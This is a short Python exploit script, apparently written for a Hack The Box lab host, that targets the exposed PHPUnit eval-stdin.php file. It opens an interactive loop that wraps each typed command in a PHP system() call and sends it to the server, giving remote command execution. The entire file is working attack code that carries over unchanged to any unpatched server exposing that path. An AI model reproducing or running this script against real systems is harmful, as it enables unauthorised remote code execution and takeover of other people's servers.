
#!/usr/bin/python3
import requests


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



url = "http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"


def exploit():
    payload = input(f"[*] {bcolors.FAIL}payload:{bcolors.ENDC} ")

    if (payload == "exit"):
        exit("exit")
    
    data=payload

    res = requests.request(method="get", url=url, data=f"<?php system(\'{payload}\') ?>")

    print(f"[*] {bcolors.FAIL}response:\n{bcolors.ENDC}{res.text}")
   

if __name__ == "__main__":
    
    while(True):
        exploit()
